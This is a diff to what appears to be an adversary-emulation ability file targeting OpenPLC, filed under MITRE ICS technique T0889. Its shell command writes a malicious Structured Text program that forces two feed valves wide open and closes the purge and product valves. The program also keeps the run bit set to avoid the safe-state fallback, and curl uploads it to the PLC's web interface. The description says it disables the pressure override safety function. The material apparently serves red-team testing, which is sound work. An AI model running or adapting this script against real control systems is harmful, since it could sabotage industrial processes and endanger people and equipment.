@@ -3,9 +3,8 @@
 - id: b2c3d4e5-2222-2222-2222-000000000003
   name: OpenPLC - Upload Malicious Control Logic
   description: |
-    Upload a modified ST program that disables the pressure override
-    safety function and forces all valves to dangerous positions.
-    The run_bit is kept TRUE to avoid triggering the safe-state fallback.
+    Write a malicious ST program using printf (no heredoc) and upload it.
+    Disables pressure override and forces dangerous valve positions.
   tactic: impair-process-control
   technique_id: T0889
   technique_name: Modify Program
@@ -13,52 +12,30 @@
   - platform: linux
     name: sh
     command: >
-      cat > /tmp/malicious.st << 'STEOF'
-
-      FUNCTION scale_to_real : REAL
-        VAR_INPUT raw_input_value : UINT := 0; END_VAR
-        VAR_OUTPUT scaled_real : REAL := 0.0; END_VAR
-        VAR_INPUT real_max : REAL := 0.0; real_min : REAL := 0.0; END_VAR
-        VAR raw_max : UINT := 65535; raw_min : UINT := 0; rate : REAL := 1.0; offset : REAL := 1.0; END_VAR
-        rate := (real_max - real_min) / UINT_TO_REAL(raw_max - raw_min);
-        offset := real_min - UINT_TO_REAL(raw_min)*rate;
-        scaled_real := UINT_TO_REAL(raw_input_value)*rate + offset;
-        scale_to_real := scaled_real;
-      END_FUNCTION
-
-      FUNCTION scale_to_uint : UINT
-        VAR_INPUT real_in : REAL := 0.0; END_VAR
-        VAR_OUTPUT uint_out : UINT := 0; END_VAR
-        uint_out := REAL_TO_UINT((real_in / 100.0) * 65535.0);
-        scale_to_uint := uint_out;
-      END_FUNCTION
-
-      PROGRAM main1
-        VAR
-          f1_valve_sp AT %QW100 : UINT;
-          f2_valve_sp AT %QW101 : UINT;
-          purge_valve_sp AT %QW102 : UINT;
-          product_valve_sp AT %QW103 : UINT;
-          run_bit AT %QX5.0 : BOOL := TRUE;
-        END_VAR
-        f1_valve_sp := 65535;
-        f2_valve_sp := 65535;
-        purge_valve_sp := 0;
-        product_valve_sp := 0;
-        run_bit := TRUE;
-      END_PROGRAM
-
-      CONFIGURATION Config0
-        RESOURCE Res0 ON PLC
-          TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
-          PROGRAM instance0 WITH task0 : main1;
-        END_RESOURCE
-      END_CONFIGURATION
-
-      STEOF
-
+      printf 'PROGRAM main1\n' > /tmp/malicious.st &&
+      printf '  VAR\n' >> /tmp/malicious.st &&
+      printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    f2_valve_sp AT %%QW101 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    purge_valve_sp AT %%QW102 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    product_valve_sp AT %%QW103 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    run_bit AT %%QX5.0 : BOOL := TRUE;\n' >> /tmp/malicious.st &&
+      printf '  END_VAR\n' >> /tmp/malicious.st &&
+      printf '  f1_valve_sp := 65535;\n' >> /tmp/malicious.st &&
+      printf '  f2_valve_sp := 65535;\n' >> /tmp/malicious.st &&
+      printf '  purge_valve_sp := 0;\n' >> /tmp/malicious.st &&
+      printf '  product_valve_sp := 0;\n' >> /tmp/malicious.st &&
+      printf '  run_bit := TRUE;\n' >> /tmp/malicious.st &&
+      printf 'END_PROGRAM\n' >> /tmp/malicious.st &&
+      printf 'CONFIGURATION Config0\n' >> /tmp/malicious.st &&
+      printf '  RESOURCE Res0 ON PLC\n' >> /tmp/malicious.st &&
+      printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);\n' >> /tmp/malicious.st &&
+      printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/malicious.st &&
+      printf '  END_RESOURCE\n' >> /tmp/malicious.st &&
+      printf 'END_CONFIGURATION\n' >> /tmp/malicious.st &&
+      echo "ST file created:" && wc -l /tmp/malicious.st &&
       curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/upload-program"
       -F "file=@/tmp/malicious.st"
-      -L -o /tmp/upload_result.html -w "%{http_code}" &&
-      echo "Program uploaded"
+      "http://192.168.95.2:8080/upload-program-action"
+      -o /tmp/upload_result.html -w "%{http_code}" &&
+      echo "PROGRAM_UPLOADED"
+    timeout: 60
